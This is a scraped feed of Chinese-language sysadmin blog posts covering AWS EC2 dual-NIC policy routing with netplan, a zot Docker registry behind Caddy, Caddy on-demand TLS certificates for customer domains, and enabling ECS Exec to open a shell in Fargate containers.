0.0.0.0/0 via: 10.0.0.1 # Default gateway, you can find it using** ip r** command table: 1002 - to: 10.0.3.176 via: 0.0.0.0 scope: link table: 1002 routing-policy: - from: 10.0.3.176 table: 1002 - from: 120.116.111.99 table: 1002 dhcp4: no dhcp6: false match: macaddress: 06:29:c3:b2:c5:f9 set-name: enX1 version: 2 netplan apply 详细解释一下，enX0是private子网的网卡，enX1是弹性IP的网卡，注意，即使是弹性IP，也是个内网地址，这两个IP呢，都有各自独立的网关，第二个网卡还有自己的DNS。这就容易发生错乱了，因为缺省路由走第一个网卡，那如果从第二个网卡的公网IP入，出的时候走第一张网卡，那就有意思了。\n所以哪来回哪，每个网卡的第二个路由，都是自己走自，策略路由的第一跳，也是自己走自己。\n然后第二个网卡的第二条策略路由，是指定的，本质意思其实是从120.116.111.99访问弹性公网IP的wireguard数据包，回程的时候强制指定走第二个网卡。\n痛苦吧！\n而且这台EC2作为跳板机，需要代理访问AWS中各种服务，这样就麻烦了，那数据包究竟要从哪个网卡出去，你必须非常清楚，如果走错了，你就必须手动增加路由表\n从第一张网卡是aws的dns服务器，是可以访问到各种aws的内网endpoint的解析地址的，第二张网卡由于是公网dns服务器，所以不行；另外第一张网卡是缺省路由；务必谨记这两点。\nip route show table all ip rule show ip rule show table 1001 ip rule show table 1002 # 手动新增路由 ip rule add from 120.116.111.99 table 1002 ip rule add to 120.116.111.99 table 1002 存在即合理，AWS本质也是魔改了LInux的各种软件和服务。\n","permalink":"https://rendoumi.com/posts/20251116-aws_private_public_ip/","summary":"\u003cp\u003e今天面试了一下，面试官问到AWS的子网问题，来说说AWS的最佳实践：\u003c/p\u003e\n\u003cp\u003e首先是VPC的划定，然后就是三个public子网，三个private子网，都是一个zone分布在a、b、c三个不同机房\u003c/p\u003e\n\u003cp\u003e来保证最大冗余性，然后pub子网通过IGW来出公网，那Private子网就通过NAT出公网。\u003c/p\u003e\n\u003cp\u003e但是，但是，但是：\u003c/p\u003e\n\u003cp\u003e如果你把一台EC2服务器一开始就放错了子网，放到了private子网里，然后上面又跑了重要的服务，无法迁移，无法重启，而且整个vpc里只有这一台ec2，其它东西都是aws的服务或者市场的服务又或者fargate、lambda之类的无服务器，这时候你想进去调试，那就麻烦大了\u003c/p\u003e\n\u003cp\u003e那能不能给这台private的机器加上公网ip来当作跳板机直接访问呢？\u003c/p\u003e\n\u003cp\u003e答案是肯定的，可以。\u003c/p\u003e\n\u003cp\u003e但是又来了，如果这么配置了，你要对路由非常的熟悉，因为随后发生错乱的情况可能需要你手动添加路由，最麻烦的不是配置网卡，而是配置路由！\u003c/p\u003e\n\u003cp\u003e做法如下：\u003c/p\u003e\n\u003cp\u003e一、动态添加弹性ip到这个ec2的第二个网卡\u003c/p\u003e\n\u003cp\u003e二、配置网络\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/netplan/50-cloud-init.yaml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# This file is generated from information provided by the datasource.  Changes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# to it will not persist across an instance reboot.  To disable cloud-init\u0026#39;s\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# network configuration capabilities, write a file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# network: {config: disabled}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ethernets:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        enX0:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            addresses:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              - 10.0.132.169/20 \u003cspan class=\"c1\"\u003e#The private IP address of primary ENI\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            nameservers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              addresses:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                - 10.0.0.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            routes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - to: 0.0.0.0/0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               via: 10.0.128.1 \u003cspan class=\"c1\"\u003e# Default gateway, you can find it using** ip r** command\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1001\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - to: 10.0.132.169\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               via: 0.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               scope: link\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            routing-policy:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - from: 10.0.132.169\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            dhcp4: no\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            dhcp6: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            match:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                macaddress: 06:36:82:ef:39:39\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            set-name: enX0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        enX1:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            addresses:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              - 10.0.3.176/20 \u003cspan class=\"c1\"\u003e#The private IP address of primary ENI\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            gateway4: 10.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            nameservers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              addresses:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                - 8.8.8.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                - 1.1.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            routes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - to: 0.0.0.0/0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               via: 10.0.0.1 \u003cspan class=\"c1\"\u003e# Default gateway, you can find it using** ip r** command\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1002\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - to: 10.0.3.176\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               via: 0.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               scope: link\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1002\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            routing-policy:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - from: 10.0.3.176\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1002\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - from: 120.116.111.99\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1002\u003c/span\u003e             \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            dhcp4: no\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            dhcp6: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            match:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                macaddress: 06:29:c3:b2:c5:f9\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            set-name: enX1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    version: \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetplan apply\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e详细解释一下，enX0是private子网的网卡，enX1是弹性IP的网卡，注意，即使是弹性IP，也是个内网地址，这两个IP呢，都有各自独立的网关，第二个网卡还有自己的DNS。这就容易发生错乱了，因为缺省路由走第一个网卡，那如果从第二个网卡的公网IP入，出的时候走第一张网卡，那就有意思了。\u003c/p\u003e","title":"AWS 放错在Private子网的机器如何用公网IP连进去"},{"content":"服务器在HK，但是去拉取腾讯广州Docker镜像仓的时候总是失败，还是企业版，大无语了。\n没办法，被逼无奈，干脆在HK建一个镜像仓，然后推送到那里，这样就方便了。\n刚开始的想法是用Harbor，但是Harbor实在太沉重了，而且Harbor的最大问题是过期镜像清理，如果过期镜像出错了，那是清理不掉的，除非重新打包上传覆盖掉错误的镜像，然后再删除才可以，但问题是如果有700、800个错的镜像，那是真没有那个劲去清理了。\n那这次就想建个轻量级的，干脆连WEB界面都不要，只要docker login后能push和pull即可！\n这样的话zot是个不错的选择，zot是兼容oci标准的，某些地方跟docker是不兼容的：\n下载zot\nwget https://github.com/project-zot/zot/releases/download/v2.1.10/zot-linux-amd64 准备配置文件\ncat \u0026gt;/usr/local/bin/config.json \u0026lt;\u0026lt; EOF { \u0026#34;distSpecVersion\u0026#34;: \u0026#34;1.0.0-dev\u0026#34;, \u0026#34;http\u0026#34;: { \u0026#34;address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: \u0026#34;5000\u0026#34;, \u0026#34;compat\u0026#34;: [\u0026#34;docker2s2\u0026#34;], \u0026#34;auth\u0026#34;: { \u0026#34;htpasswd\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;/usr/local/bin/htpasswd\u0026#34; } } }, \u0026#34;storage\u0026#34;: { \u0026#34;rootDirectory\u0026#34;: \u0026#34;/data/registry\u0026#34; } } EOF 注意上面compat，如果不配置，就会出现push的时候出现manifest invalid错误，这是因为docker和oci的标准不同，zot是遵循oci标准的\n准备htpasswd，必须用bcrypt的方式，zot不支持其它的！\n-B Force bcrypt hashing of the password (very secure) htpasswd -B -c /usr/local/bin/htpasswd user01 准备zot.service\ncat \u0026gt; /etc/systemd/system/zot.service \u0026lt;\u0026lt; EOF [Unit] After=network.target nss-lookup.target [Service] User=root ExecStart=/usr/local/bin/zot-linux-amd64 serve /usr/local/bin/config.json Restart=on-failure RestartSec=10s LimitNOFILE=infinity [Install] WantedBy=multi-user.target EOF 那大家注意到了，zot只监听到了127.0.0.1:5000，所以前面还需要用caddy代理一下\n准备caddy的配置文件\ncat \u0026gt; /usr/local/bin/Caddyfile \u0026lt;\u0026lt; EOF registry.rendoumi.com { reverse_proxy 127.0.0.1:5000 { header_up X-Real-IP {remote_host} transport http { dial_timeout 15s response_header_timeout 300s } } } EOF 准备caddy的systemd文件\ncat \u0026gt; /etc/systemd/system/caddy.service \u0026lt;\u0026lt; EOF [Unit] After=network.target Wants=network.target [Service] WorkingDirectory=/usr/local/bin/ Type=simple User=root ExecStart=/usr/local/bin/caddy run --config /usr/local/bin/Caddyfile Restart=on-failure RestartSec=1s [Install] WantedBy=multi-user.target EOF 分别启动服务就好了\nsystemctl daemon-reload systemctl start zot systemctl start caddy 因为完全没有web界面，只能用curl进行测试了\ncurl -u user01:password http://localhost:5000/v2/_catalog -vvvv 成功后用docker login后，docker push、docker pull 进行验证就OK了\n","permalink":"https://rendoumi.com/posts/20251111-zot_registry/","summary":"\u003cp\u003e服务器在HK，但是去拉取腾讯广州Docker镜像仓的时候总是失败，还是企业版，大无语了。\u003c/p\u003e\n\u003cp\u003e没办法，被逼无奈，干脆在HK建一个镜像仓，然后推送到那里，这样就方便了。\u003c/p\u003e\n\u003cp\u003e刚开始的想法是用Harbor，但是Harbor实在太沉重了，而且Harbor的最大问题是过期镜像清理，如果过期镜像出错了，那是清理不掉的，除非重新打包上传覆盖掉错误的镜像，然后再删除才可以，但问题是如果有700、800个错的镜像，那是真没有那个劲去清理了。\u003c/p\u003e\n\u003cp\u003e那这次就想建个轻量级的，干脆连WEB界面都不要，只要docker login后能push和pull即可！\u003c/p\u003e\n\u003cp\u003e这样的话zot是个不错的选择，zot是兼容oci标准的，某些地方跟docker是不兼容的：\u003c/p\u003e\n\u003cp\u003e下载zot\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/project-zot/zot/releases/download/v2.1.10/zot-linux-amd64\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e准备配置文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u0026gt;/usr/local/bin/config.json \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;distSpecVersion\u0026#34;: \u0026#34;1.0.0-dev\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;http\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;port\u0026#34;: \u0026#34;5000\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;compat\u0026#34;: [\u0026#34;docker2s2\u0026#34;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;auth\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026#34;htpasswd\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        \u0026#34;path\u0026#34;: \u0026#34;/usr/local/bin/htpasswd\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;storage\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;rootDirectory\u0026#34;: \u0026#34;/data/registry\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面compat，如果不配置，就会出现push的时候出现\u003ccode\u003emanifest invalid\u003c/code\u003e错误，这是因为docker和oci的标准不同，zot是遵循oci标准的\u003c/p\u003e\n\u003cp\u003e准备htpasswd，必须用bcrypt的方式，zot不支持其它的！\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-B  Force bcrypt hashing of the password \u003cspan class=\"o\"\u003e(\u003c/span\u003every secure\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehtpasswd -B -c /usr/local/bin/htpasswd user01\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e准备\u003ccode\u003ezot.service\u003c/code\u003e\u003c/p\u003e","title":"安装轻量级的Docker registry：zot"},{"content":"公司的SAAS平台，本来多租户的证书管理模式预计是这样的：\n给每个租户单独设立一个 xyz.alibaba.com 的子域名，然后用cert-manager管理证书，只要annouce一个 xyz.alibaba.com 的ingress出来，就会自动签发证书。\n然而研发觉得这样也是很不爽，连annouce ingress也不愿意，就想客户的域名直接解析一个 xyz.客户.com 的 cname 过来，然后就自动签发证书。\n这个需求真的是很有意思，也只有caddy能很轻松的这么实现，方法如下：\n一、做好一个caddy的deploy和service，前面直接顶一个Loadbalance\n二、配置caddy的配置\n/etc/caddy/Caddyfile 的内容\n{ debug on_demand_tls { ask http://localhost:5555/ } } https:// { tls { on_demand } handle { reverse_proxy https://alibaba.com { header_up Host alibaba.com } } respond \u0026#34;Welcome to dynamic certificate signing!\u0026#34; 200 } http://localhost:5555 { respond 200 } 注意上面，Caddy对这种随便的域名，是要求去问一下后端的服务是否对这个域名进行签发的，这是为了防止滥用。\n我们直接做个虚拟服务，回应200即可\n这样的做法比较直接了当，当然只适用于国外，国内就麻烦了，未知的域名解析到你的ip上，没备案直接就会被封站。\n","permalink":"https://rendoumi.com/posts/20251110-caddy_wild_certificate/","summary":"\u003cp\u003e公司的SAAS平台，本来多租户的证书管理模式预计是这样的：\u003c/p\u003e\n\u003cp\u003e给每个租户单独设立一个 xyz.alibaba.com 的子域名，然后用cert-manager管理证书，只要annouce一个 xyz.alibaba.com 的ingress出来，就会自动签发证书。\u003c/p\u003e\n\u003cp\u003e然而研发觉得这样也是很不爽，连annouce ingress也不愿意，就想客户的域名直接解析一个 xyz.客户.com 的 cname 过来，然后就自动签发证书。\u003c/p\u003e\n\u003cp\u003e这个需求真的是很有意思，也只有caddy能很轻松的这么实现，方法如下：\u003c/p\u003e\n\u003cp\u003e一、做好一个caddy的deploy和service，前面直接顶一个Loadbalance\u003c/p\u003e\n\u003cp\u003e二、配置caddy的配置\u003c/p\u003e\n\u003cp\u003e/etc/caddy/Caddyfile 的内容\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    debug\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    on_demand_tls \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ask http://localhost:5555/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps:// \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    tls \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        on_demand\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    handle \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        reverse_proxy https://alibaba.com \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            header_up Host alibaba.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    respond \u003cspan class=\"s2\"\u003e\u0026#34;Welcome to dynamic certificate signing!\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://localhost:5555 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        respond \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面，Caddy对这种随便的域名，是要求去问一下后端的服务是否对这个域名进行签发的，这是为了防止滥用。\u003c/p\u003e\n\u003cp\u003e我们直接做个虚拟服务，回应200即可\u003c/p\u003e\n\u003cp\u003e这样的做法比较直接了当，当然只适用于国外，国内就麻烦了，未知的域名解析到你的ip上，没备案直接就会被封站。\u003c/p\u003e","title":"Caddy自动签发任意域名证书"},{"content":"公司用到了Amazon Elastic Container Service，完全托管的容器服务\n服务器用的是Fargate，没有自己的服务器，纯托管的，开始部署的时候，也没有考虑到有一天要进入容器进行调试。\n现在麻烦就来了，需要进入容器，查看文件日志\n结果就很麻烦，解决的步骤如下：\n一、查看集群状态，看看任务定义的版本号，下面是206 二、去到相应的任务定义 注意，现在只有一个任务执行角色，任务角色是个空的！！！\n然后我们点开任务执行角色，添加权限\n初始化的时候只有AmazonECSTaskExecutionRolePolicy, 我们需要加上AmazonSSMManagedInstanceCore\n加完就上面一样。\n三、返回到任务定义，使用JSON创建新修订 \u0026#34;taskRoleArn\u0026#34;: \u0026#34;arn:xxxx:ecsTaskExecutionRole\u0026#34;, \u0026#34;executionRoleArn\u0026#34;: \u0026#34;arn:ecsTaskExecutionRole\u0026#34;, 新增taskRoleArn，和executionRoleArn保持一致，然后保存\n四、按照新版本，部署新任务 从新任务定义更新服务\n选择相应集群，相应服务\n故障排除配置，务必开启ECS exec，然后更新即可\n五、开启容器的shell 我去集群\u0026ndash;服务\u0026ndash;容器，点击连接\naws ecs execute-command --cluster yoov_work_e_form_prod_cluster --task 23xxxxx --container yontainer --interactive --command \u0026#39;/bin/sh\u0026#39; 